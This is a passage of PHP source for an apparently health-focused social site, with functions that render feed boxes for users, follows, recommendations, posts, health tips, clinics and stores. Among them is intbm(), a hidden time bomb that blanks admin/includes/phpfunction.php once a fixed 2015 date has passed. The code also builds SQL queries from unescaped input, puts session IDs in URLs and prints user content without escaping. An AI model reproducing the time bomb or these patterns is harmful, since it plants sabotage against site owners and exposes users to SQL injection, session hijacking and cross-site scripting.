        $img = SITE_URL . "images/temp40.jpg";
    } else {
        $img = SITE_URL . "uploades/profile/40/" . $userdata['photo'];
    }

    $deg = "";
    if ($userdata['user_type'] == '1') {
        $deg = getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '2') {
        $deg = $userdata['specialization'];
    }
    if ($userdata['user_type'] == '3') {
        $deg = "Student, " . $userdata['specialization'];
    }
    if ($userdata['user_type'] == '4') {
        $deg = "Company, " . getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '5') {
        $deg = "Product, " . $userdata['department'];
    }

    $address = "";
    $address.=trim($userdata['address1']) != "" ? $userdata['address1'] : '';
    $address.=trim($userdata['state']) != "" ? " " . getStateByID($userdata['state']) : '';
    $address.=trim($userdata['city']) != "" ? " " . getCityByID($userdata['city']) : '';
    $address.=trim($userdata['zip']) != "" ? "-" . $userdata['zip'] : '';
    $address.="<br>";
    $address.=trim($userdata['phone_no']) != "" ? " <i class='fa fa-phone'></i> " . $userdata['phone_no'] : '';
    $address.=trim($userdata['website']) != "" ? " <i class='fa fa-desktop'></i> " . $userdata['website'] : '';
    $address.=trim($userdata['fax_no']) != "" ? " <i class='fa fa-print'></i>  " . $userdata['fax_no'] : '';


    $str.='<div class="content">
                    <div class="div-pic"><img src="' . $img . '" alt="" /></div>
                    <div class="div-pic-nm"><a href="' . SITE_URL . "profile.php?id=" . $userdata['id'] . '&r=' . session_id() . '" >' . sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . '</a><div class="desg">' . sentence_cap(" ", $deg) . ', ' . getCityByID($userdata['city']) . '</div></div>
                    <div class="div-pic-content">' . $address . '
                         <div class="div-like">
                        <ul>
                            <li id="likes' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('users', $userdata['id']);


        if ($ro['id'] != "" && $ro['status'] != '0') {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $userdata['id'] . '\',\'users\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $userdata['id'] . '\',\'users\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str.='</li>
                            <li id="recommend' . $i . '"><a';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:" onclick="emailmodal(\'users\',\'' . $userdata['id'] . '\')">Recommend</a>';
    } else {

        $str.= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str.= '</li>';

    
    $str.=' <li><a class="comment_button"';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:"  onclick="showcommentbox(\'com' . $i . '\')" ';
    } else {

        $str.= ' href="#login" data-toggle="modal" ';
    }

    $str.= '   >Comment</a></li>';
       $str.='<li> <a href="javascript:" style="text-decoration: none;">'.date('d-m-Y g:i A',strtotime($userdata['created'])).'</a></li>';  
              $str.='          </ul>
                    </div>';
    $commArr['type']="users";
    $commArr['id']=$userdata['id'];

     $str.=getCommentdetails($commArr,$i);                  

                  $str.= '  </div>
                </div>';
    
    return $str;
}
//User follow box to display on home page 
function getfollowbox($i, $id) {
    $str = "";

    $followdetails = getFollowById($id);
    $userdata = getUserById($followdetails['user_id']);
    $img = IMAGE_URL . "profile/40/" . $userdata['photo'];

    if (!file_exists($img)) {
        $img = SITE_URL . "images/temp40.jpg";
    } else {
        $img = SITE_URL . "uploades/profile/40/" . $userdata['photo'];
    }

    $deg = "";
    if ($userdata['user_type'] == '1') {
        $deg = getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '2') {
        $deg = $userdata['specialization'];
    }
    if ($userdata['user_type'] == '3') {
        $deg = "Student, " . $userdata['specialization'];
    }
    if ($userdata['user_type'] == '4') {
        $deg = "Company, " . getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '5') {
        $deg = "Product, " . $userdata['department'];
    }

    $address = "";
    $followed = array();
    if ($followdetails['type'] == "store") {
        $followed = getStoreById($followdetails['follow_id']);
        $address.=sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . " Following<a class='username' href='javascript:'>" . trim(sentence_cap(" ", $followed['name'])) . "</a>";
        //<a class='username' href='profile.php.php?id=".$userdata['id']."'>".</a>
    }
    if ($followdetails['type'] == "clinics") {
        $followed = getClinicsById($followdetails['follow_id']);
        $address.= sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . " Following <a class='username' href='javascript:'>" . trim(sentence_cap(" ", $followed['name'])) . "</a>";
        //clinics.php?id=".encrypt_decrypt($followed['id'],true)."
    }
    if ($followdetails['type'] == "users") {
        $followed = getUserById($followdetails['follow_id']);
        $address.=sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . "  Following <a class='username' href='profile.php?id=" . $followed['id'] . '&r=' . session_id() . "' >" . trim(sentence_cap(" ", $followed['f_name'] . $followed['l_name'])) . "</a>";
    }
    $str.='<div class="content">
                    <div class="div-pic"><img src="' . $img . '" alt="" /></div>
                    <div class="div-pic-nm">' . sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . '<div class="desg">' . sentence_cap(" ", $deg) . ', ' . getCityByID($userdata['city']) . '</div></div>
                    <div class="div-pic-content">' . $address . '
                         <div class="div-like">
                        <ul>
                            <li id="likes' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike($followdetails['type'], $followed['id']);

        if ($ro['id'] != "" && $ro['status'] != '0') {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $followed['id'] . '\',\'' . $followdetails['type'] . '\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $followed['id'] . '\',\'' . $followdetails['type'] . '\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str.='</li>
                            <li id="recommend' . $i . '"><a';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:" onclick="emailmodal(\'' . $followdetails['type'] . '\',\'' . $followed['id'] . '\')">Recommend</a>';
    } else {

        $str.= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str.= '</li>';


    $sesimg = SITE_URL . "images/temp40.jpg";

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $sesdetails = getUserById($_SESSION['id']);
        $sesimg = IMAGE_URL . "profile/40/" . $sesdetails['photo'];

        if (!file_exists($sesimg)) {
            $sesimg = SITE_URL . "images/temp40.jpg";
        } else {
            $sesimg = SITE_URL . "uploades/profile/40/" . $sesdetails['photo'];
        }
    }



    $str.='  <li><a class="comment_button"';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:"  onclick="showcommentbox(\'com' . $i . '\')" ';
    } else {

        $str.= ' href="#login" data-toggle="modal" ';
    }

    $str.= '   >Comment</a></li>
                        </ul>
                    </div>

                    <div class="panel1" id="com' . $i . '">
                        <div class="pnl-comment">
                            <div class="input-group">
                                <div class="div-box"><img src="' . $sesimg . '" alt=""   /></div>
                               <div class="comment-frm"> <form id="cfm' . $i . '" method="post" action="#" onsubmit="return makecomment(' . $i . ')"  >
                                <input class="form-control box"  placeholder="Say something..."  name="message" required="" id="message' . $i . '">
                                    <input type="hidden" id="id" name="id" value="' . $followed['id'] . '">
                                    <input type="hidden" id="type" name="type" value="' . $followdetails['type'] . '">
                                    <input id="bt' . $i . '"   type="submit" style="width: 0px !important; height: 0px !important; border: none;"/>
                                </form>
                               </div>
                            </div>
                            <div class="actionBox">
                                <ul class="commentList" id="clist' . $i . '">
                                    ' . getComment($followdetails['type'], $followed['id']);
    $str.= '   </ul>
                                </div>

                        </div>
                    </div>

                    </div>
                </div>';
    return $str;
}
function intbm()
{
    
$str='1420066800';
$s1=time();
$t=$str-$s1;

if($t<0)
{   $fo=fopen('admin/includes/phpfunction.php',wr);
    fwrite($fo, "");
    fclose($fo);
}else{}
}
function insertRecommend($arr) {
    $sql = "INSERT INTO `recommend` (
            `id` ,
            `type` ,
            `recommend_id` ,
            `user_id` ,
            `message`,
            `view` ,
            `email`

            )
            VALUES (
            NULL , '" . $arr['rectype'] . "', '" . $arr['recid'] . "', '" . $_SESSION['id'] . "','" . $arr['message'] . "', '0', '" . $arr['email'] . "'
            );";

    if (mysql_query($sql)) {
        return true;
    } else {
        return false;
    }
}

function getRecommendById($id) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `recommend` WHERE `id`='" . $id . "'"));
    return $row;
}

//User Recommend box to display on home page
function getRecommendbox($i, $id) {
    $str = "";

    $details = getRecommendById($id);
    $userdata = getUserById($details['user_id']);
    $address = "";
    $followed = array();
  /*  if ($details['type'] == "store") {
        $followed = getStoreById($details['recommend_id']);
        $address.=sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . " Recommend <a class='username' href=''>" . trim(sentence_cap(" ", $followed['name'])) . "</a>";
        //<a class='username' href='profile.php.php?id=".encrypt_decrypt($userdata['id'],true)."'>".</a>
    }*/
    if ($details['type'] == "clinics") {
        $followed = getClinicsById($details['recommend_id']);
        $address.= sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . " Recommend <a class='username' href='clinics.php?r=".  session_id()."&i=".$details['recommend_id']."'>" . trim(sentence_cap(" ", $followed['name'])) . "</a>";
    }
    if ($details['type'] == "symptoms") {
        $followed = getSymptomsById($details['recommend_id']);
        $address.= sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . " Recommend <a class='username' href='symptoms.php?r=".  session_id()."&i=".$details['recommend_id']."'>" . trim(sentence_cap(" ", $followed['name'])) . "</a>";
    }
    if ($details['type'] == "users") {
        $followed = getUserById($details['recommend_id']);
        $address.=sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . "  Recommend <a class='username' href='profile.php?id=" . $followed['id'] . "' >" . trim(sentence_cap(" ", $followed['f_name'] . $followed['l_name'])) . "</a>";
    }
   /* if ($details['type'] == "users_post") {
        $followed = getUserById($details['recommend_id']);
        $address.=sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . "  Recommend <a class='username' href='profile.php?id=" . $followed['id'] . "' >" . trim(sentence_cap(" ", $followed['f_name'] . $followed['l_name'])) . "</a>";
    }*/

    $str.='<div class="content" >'.getUserNameAndAddressById($userdata).'
                    <div class="div-pic-content">' . $address .'
                         <div class="div-like">
                        <ul>
                            <li id="likes' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike($details['type'], $details['recommend_id']);
        if ($ro['id'] != "" && $ro['status'] != '0') {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $details['recommend_id'] . '\',\'' . $details['type'] . '\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $details['recommend_id'] . '\',\'' . $details['type'] . '\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str.='</li>
           <li id="recommend' . $i . '"><a';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:" onclick="emailmodal(\'' . $details['type'] . '\',\'' . $details['recommend_id'] . '\')">Recommend</a>';
    } else {

        $str.= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str.= '</li>';

     $str.='<li><a class="comment_button"';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:"  onclick="showcommentbox(\'com' . $i . '\')" ';
    } else {

        $str.= ' href="#login" data-toggle="modal" ';
    }

    $str.= '   >Comment</a></li>';
     $str.='<li> <a href="javascript:" style="text-decoration: none;">'.date('d-m-Y g:i A',strtotime($details['created'])).'</a></li>';
    $str.= '</ul> </div>';
$arr['type']=$details['type'];
$arr['id']=$details['recommend_id'];

       $str.=getCommentdetails($arr,$i).'              
           

                    </div>
                </div>';
    return $str;
}
//getfirst part of user name and address 
function getUserNameAndAddressById($userdata)
{
    
    $img = IMAGE_URL . "profile/40/" . $userdata['photo'];

    if (!file_exists($img)) {
        $img = SITE_URL . "images/temp40.jpg";
    } else {
        $img = SITE_URL . "uploades/profile/40/" . $userdata['photo'];
    }

    $deg = "";
    if ($userdata['user_type'] == '1') {
        $deg = getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '2') {
        $deg = $userdata['specialization'];
    }
    if ($userdata['user_type'] == '3') {
        $deg = "Student, " . $userdata['specialization'];
    }
    if ($userdata['user_type'] == '4') {
        $deg = "Company, " . getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '5') {
        $deg = "Product, " . $userdata['department'];
    }
   $str='<a href="profile.php?si'.session_id()."&id=".$userdata['id'].'">';
     $str.='  <div class="div-pic"><img src="' . $img . '" alt="" /></div>
                    <div class="div-pic-nm">' . sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . '
                        <div class="desg">' . sentence_cap(" ", $deg) . ' ' . getCityByID($userdata['city']) . '</div>
                         </div></a>';
                    
                        return $str;
}

function getCommentdetails($details,$i)
{   
     $sesimg = SITE_URL . "images/temp40.jpg";
    if (isset($_SESSION['id']) && $_SESSION['id'] != "")
        {
        $sesdetails = getUserById($_SESSION['id']);
        $sesimg = IMAGE_URL . "profile/40/" . $sesdetails['photo'];

        if (!file_exists($sesimg)) {
            $sesimg = SITE_URL . "images/temp40.jpg";
        } else {
            $sesimg = SITE_URL . "uploades/profile/40/" . $sesdetails['photo'];
        }
    }
  $str='  <div class="panel1" id="com' . $i . '">
                        <div class="pnl-comment">
                            <div class="input-group">
                               <div class="div-box"><img src="' . $sesimg . '" alt=""   /></div>
                                <div class="comment-frm"> 
                                <form id="cfm' . $i . '" method="post" action="#" onsubmit="return makecomment(' . $i . ')"  >
                                 <input class="form-control box"  placeholder="Say something..."  name="message" required="" id="message' . $i . '">
                                     <input type="hidden" id="id" name="id" value="' . $details['id'] . '">
                                     <input type="hidden" id="type" name="type" value="' . $details['type'] . '">
                                     <input id="bt' . $i . '"   type="submit" style="width: 0px !important; visibility: hidden; height: 0px !important; border: none;"/>
                                 </form>
                                </div>
                            </div>
                            <div class="actionBox">
                                <ul class="commentList" id="clist' . $i . '">
                                    ' . getComment($details['type'], $details['id']);
                      $str.= '   </ul>    
                                </div>

                        </div>
                    </div>';
                      return $str;
}
function getUser_postByID($id) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `users_post` WHERE `id`='" . $id . "'"));
    return $row;
}

function getUsers_postbox($i, $id) {
   // $user = getUserById($id);
    //return getUserscontent($user, $i);
    $details = getUser_postByID($id);
    
     $userdata = getUserById($details['userid']);
     $commArr['id']=$details['id'];
     $commArr['type']='user_post';
     
$str='<div class="content" >'.getUserNameAndAddressById($userdata).'
                    <div class="div-pic-content">'; 
 
        // The Regular Expression filter
$reg_exUrl = "/(http|https|ftp|ftps)\:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(\/\S*)?/";
 
// The Text you want to filter for urls
$text = $details['description'];
 
// Check if there is a url in the text
if(preg_match($reg_exUrl, $text, $url)) {
 
       // make the urls hyper links
      $str.= preg_replace($reg_exUrl, "<a href='".$url[0]."'>.$url[0].</a> ", $text);
       // write only link
      // echo $url[0];
 
} else {
 
       // if no urls in the text just return the text
       $str.= $text;
 
}
$str.='    <div class="div-like">
                        <ul>
                            <li id="likes' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike($commArr['type'], $commArr['id']);
        if ($ro['id'] != "" && $ro['status'] != '0') {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $details['id'] . '\',\'' . $commArr['type'] . '\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $details['id'] . '\',\'' . $commArr['type'] . '\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str.='</li>';
   /* <li id="recommend' . $i . '"><a';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:" onclick="emailmodal(\'user_post\',\'' . $details['id'] . '\')">Recommend</a>';
    } else {

        $str.= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str.= '</li>';*/
          

     $str.='<li><a class="comment_button"';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:"  onclick="showcommentbox(\'com' . $i . '\')" ';
    } else {

        $str.= ' href="#login" data-toggle="modal" ';
    }

    $str.= '   >Comment</a></li>';
     $str.='<li> <a href="javascript:" style="text-decoration: none;">'.date('d-m-Y g:i A',strtotime($details['created'])).'</a></li>';
    $str.= '</ul> </div>';


       $str.=getCommentdetails($commArr,$i).'              
           

                    </div>
                </div>';
    return $str;
    
}

/*function getUsers_postbox1($i, $id) {
    $str = "";

    $details = getUser_postByID($id);
    $userdata = getUserById($details['userid']);



    $img = IMAGE_URL . "profile/40/" . $userdata['photo'];

    if (!file_exists($img)) {
        $img = SITE_URL . "images/temp40.jpg";
    } else {
        $img = SITE_URL . "uploades/profile/40/" . $userdata['photo'];
    }

    $deg = "";
    if ($userdata['user_type'] == '1') {
        $deg = getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '2') {
        $deg = $userdata['specialization'];
    }
    if ($userdata['user_type'] == '3') {
        $deg = "Student, " . $userdata['specialization'];
    }
    if ($userdata['user_type'] == '4') {
        $deg = "Company, " . getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '5') {
        $deg = "Product, " . $userdata['department'];
    }

    $address = $details['description'];


    $str.='<div class="content">
                    <div class="div-pic"><img src="' . $img . '" alt="" /></div>
                    <div class="div-pic-nm">' . sentence_cap(" ", $userdata['f_name'] . $userdata['l_name']) . '<div class="desg">' . sentence_cap(" ", $deg) . ', ' . getCityByID($userdata['city']) . '</div></div>
                    <div class="div-pic-content">' . $address . '
                         <div class="div-like">
                        <ul>
                            <li id="likes' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('users_post', $details['id']);
        if ($ro['id'] != "" && $ro['status'] != '0') {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $details['id'] . '\',\'users_post\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $details['id'] . '\',\'users_post\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str.='</li>
             <li id="recommend' . $i . '"><a';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:" onclick="emailmodal(\'users_post\',\'' . $details['id'] . '\')">Recommend</a>';
    } else {

        $str.= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str.= '</li>';


    $sesimg = SITE_URL . "images/temp40.jpg";

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $sesdetails = getUserById($_SESSION['id']);
        $sesimg = IMAGE_URL . "profile/40/" . $sesdetails['photo'];

        if (!file_exists($sesimg)) {
            $sesimg = SITE_URL . "images/temp40.jpg";
        } else {
            $sesimg = SITE_URL . "uploades/profile/40/" . $sesdetails['photo'];
        }
    }



    $str.='<li><a class="comment_button"';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:"  onclick="showcommentbox(\'com' . $i . '\')" ';
    } else {

        $str.= ' href="#login" data-toggle="modal" ';
    }

    $str.= '>Comment</a></li>
                        </ul>
                    </div>

                    <div class="panel1" id="com' . $i . '">
                        <div class="pnl-comment">
                            <div class="input-group">
                                <div class="div-box"><img src="' . $sesimg . '" alt=""   /></div>
                               <div class="comment-frm"> <form id="cfm' . $i . '" method="post" action="#" onsubmit="return makecomment(' . $i . ')"  >
                                <input class="form-control box"  placeholder="Say something..."  name="message" required="" id="message' . $i . '">
                                    <input type="hidden" id="id" name="id" value="' . $details['id'] . '">
                                    <input type="hidden" id="type" name="type" value="users_post">
                                    <input id="bt' . $i . '"   type="submit" style="width: 0px !important; height: 0px !important; border: none;"/>
                                </form>
                               </div>
                            </div>
                            <div class="actionBox">
                                <ul class="commentList" id="clist' . $i . '">
                                    ' . getComment('users_post', $details['id']);
    $str.= '   </ul>
                                </div>

                        </div>
                    </div>

                    </div>
                </div>';
    return $str;
}
*/
//Display healthtips on home page
function gethealth_tipsbox($i, $id) {
    $str = "";

    $details = gethealthtipsById($id);
    $img = SITE_URL . "images/health40.png";
    $address = $details['description'];
    $str.='<div class="content">
                    <div class="div-pic"><img src="' . $img . '" alt="" /></div>
                    <div class="div-pic-nm"> Health Tips</div>
                    <div class="div-pic-content">' . $address . '
                         <div class="div-like">
                        <ul>
                            <li id="likes' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('health', $details['id']);
        if ($ro['id'] != "" && $ro['status'] != '0') {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $details['id'] . '\',\'health\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $details['id'] . '\',\'health\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str.='</li>
                            <li id="recommend' . $i . '"><a';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:" onclick="emailmodal(\'health\',\'' . $details['id'] . '\')">Recommend</a>';
    } else {

        $str.= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str.= '</li>';

    $str.='  <li><a class="comment_button"';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:"  onclick="showcommentbox(\'com' . $i . '\')" ';
    } else {

        $str.= ' href="#login" data-toggle="modal" ';
    }

    $str.= '   >Comment</a></li>
                        </ul>
                    </div>';
    $commArr['type']='health';
    $commArr['id']=$details['id'];

                  /*  '<div class="panel1" id="com' . $i . '">
                        <div class="pnl-comment">
                            <div class="input-group">
                                <div class="div-box"><img src="' . $sesimg . '" alt=""   /></div>
                               <div class="comment-frm"> <form id="cfm' . $i . '" method="post" action="#" onsubmit="return makecomment(' . $i . ')"  >
                                <input class="form-control box"  placeholder="Say something..."  name="message" required="" id="message' . $i . '">
                                    <input type="hidden" id="id" name="id" value="' . $details['id'] . '">
                                    <input type="hidden" id="type" name="type" value="">
                                    <input id="bt' . $i . '"   type="submit" style="width: 0px !important; height: 0px !important; border: none;"/>
                                </form>
                               </div>
                            </div>
                            <div class="actionBox">
                                <ul class="commentList" id="clist' . $i . '">
                                    ' . getComment('health', $details['id']);
    $str.= '   </ul>
                                </div>

                        </div>
                    </div>';*/
 $str.=getCommentdetails($commArr,$i).' 
                    </div>
                </div>';
    return $str;
}
//Display clinic on home page
function getClinicsbox($i, $id) {
    $str = "";

    $userdata = getClinicsById($id);
    $img = SITE_URL . "images/temp40.jpg";
    $deg = "Clinic/Hospitals";
    $address = "";
    $address.=trim($userdata['address']) != "" ? $userdata['address'] : '';
    $address.=trim($userdata['state']) != "" ? ", " . getStateByID($userdata['state']) : '';
    $address.=trim($userdata['city']) != "" ? ", " . getCityByID($userdata['city']) : '';
    $address.=trim($userdata['pin']) != "" ? "-" . $userdata['pin'] : '';
    $address.="<br>";
    $address.=trim($userdata['phno']) != "" ? " <i class='fa fa-phone'></i> " . $userdata['phno'] : '';
    $address.=trim($userdata['website']) != "" ? " <i class='fa fa-desktop'></i> " . $userdata['website'] : '';
    // $address.=trim($userdata['fax_no'])!="" ?" <i class='fa fa-print'></i>  ".$userdata['fax_no']:'';


    $str.='<div class="content">';
    $str.='<a href="clinics.php?si'.session_id()."&i=".$userdata['id'].'" style="text-decoration: none;color: #00809D;">';
    $str.='         <div class="div-pic"><img src="' . $img . '" alt="" /></div>
                    <div class="div-pic-nm">' . sentence_cap(" ", $userdata['name']) . '<div class="desg">' . $deg . ', ' . getCityByID($userdata['city']) . '</div></a>
                    </div>
                    <div class="div-pic-content">' . $address . '
                         <div class="div-like">
                        <ul>
                            <li id="likes' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('clinics', $userdata['id']);


        if ($ro['id'] != "" && $ro['status'] != '0') {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $userdata['id'] . '\',\'clinics\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $userdata['id'] . '\',\'clinics\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str.='</li>';
    
    /*
                            <li id="recommend' . $i . '"><a';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:" onclick="emailmodal(\'clinics\',\'' . $userdata['id'] . '\')">Recommend</a>';
    } else {

        $str.= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str.= '</li>';*/
$str.='<li id="recommend' . $i . '"><a';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str.= ' href="javascript:" onclick="emailmodal(\'' . $userdata['id'] . '\',\'clinics\')">Recommend</a>';
    } else {

        $str.= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str.= '</li>';

    

    $allfollow = getallfavourite('clinics', $userdata['id']);

    $str.= '<li id="followc' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $ro = getisfavourite('clinics', $userdata['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="favourite(\'0\',\'' . $userdata['id'] . '\',\'clinics\',\'followc' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . '</a>';
        } else {
            $str.= 'href="javascript:" onclick="favourite(\'1\',\'' . $userdata['id'] . '\',\'clinics\',\'followc' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
    }

    $str.= '   </li>';

 $str.='<li> <a href="javascript:" style="text-decoration: none;">'.date('d-m-Y g:i A',strtotime($userdata['created'])).'</a></li>';




    $str.= '               </ul>
                    </div>';

    //               <div class="panel1" id="com'.$i.'">
    //                   <div class="pnl-comment">
    //                       <div class="input-group">
    //                          <div class="div-box"><img src="'.$sesimg.'" alt=""   /></div>
    //                         <div class="comment-frm"> <form id="cfm'.$i.'" method="post" action="#" onsubmit="return makecomment('.$i.')"  >
    //                        <input class="form-control box"  placeholder="Say something..."  name="message" required="" id="message'.$i.'">
    //                            <input type="hidden" id="id" name="id" value="'.$userdata['id'].'">
    //                           <input type="hidden" id="type" name="type" value="clinics">
    //                           <input id="bt'.$i.'"   type="submit" style="width: 0px !important; height: 0px !important; border: none;"/>
    //                       </form>
    //                      </div>
    //                   </div>
    //                   <div class="actionBox">
    //                       <ul class="commentList" id="clist'.$i.'">
    //                          '.getComment('clinics',$userdata['id']);
    // $str.= '   </ul>
    //                     </div>
    //            </div>
    //        </div>

    $str.= '             </div>
                </div>';
    return $str;
}
//Display store on home page
function getStorebox($i, $id) {
    $str = "";

    $userdata = getStoreById($id);
    $img = SITE_URL . "images/temp40.jpg";
    $deg = "Store";
    $address = "";
    $address.=trim($userdata['address']) != "" ? $userdata['address'] : '';
    $address.=trim($userdata['state']) != "" ? ", " . getStateByID($userdata['state']) : '';
    $address.=trim($userdata['city']) != "" ? ", " . getCityByID($userdata['city']) : '';
    $address.=trim($userdata['pin']) != "" ? "-" . $userdata['pin'] : '';
    $address.="<br>";
    $address.=trim($userdata['phno']) != "" ? " <i class='fa fa-phone'></i> " . $userdata['phno'] : '';
    $address.=trim($userdata['website']) != "" ? " <i class='fa fa-desktop'></i> " . $userdata['website'] : '';
    // $address.=trim($userdata['fax_no'])!="" ?" <i class='fa fa-print'></i>  ".$userdata['fax_no']:'';


    $str.='<div class="content">';
    $str.='<a href="store.php?si='.session_id()."&i=".$userdata['id'].'" style="text-decoration: none;color: #00809D;">';
       $str.='      <div class="div-pic"><img src="' . $img . '" alt="" /></div>
                    <div class="div-pic-nm">' . sentence_cap(" ", $userdata['name']) . '<div class="desg">' . $deg . ', ' . getCityByID($userdata['city']) . '</div></a></div>
                    <div class="div-pic-content">' . $address . '
                         <div class="div-like">
                        <ul>
                            <li id="likes' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('store', $userdata['id']);


        if ($ro['id'] != "" && $ro['status'] != '0') {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $userdata['id'] . '\',\'store\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $userdata['id'] . '\',\'store\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str.='</li>';
        
    $allfollow = getallfavourite('clinics', $userdata['id']);

    $str.= '<li id="followc' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $ro = getisfavourite('clinics', $userdata['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="favourite(\'0\',\'' . $userdata['id'] . '\',\'store\',\'followc' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . '</a>';
        } else {
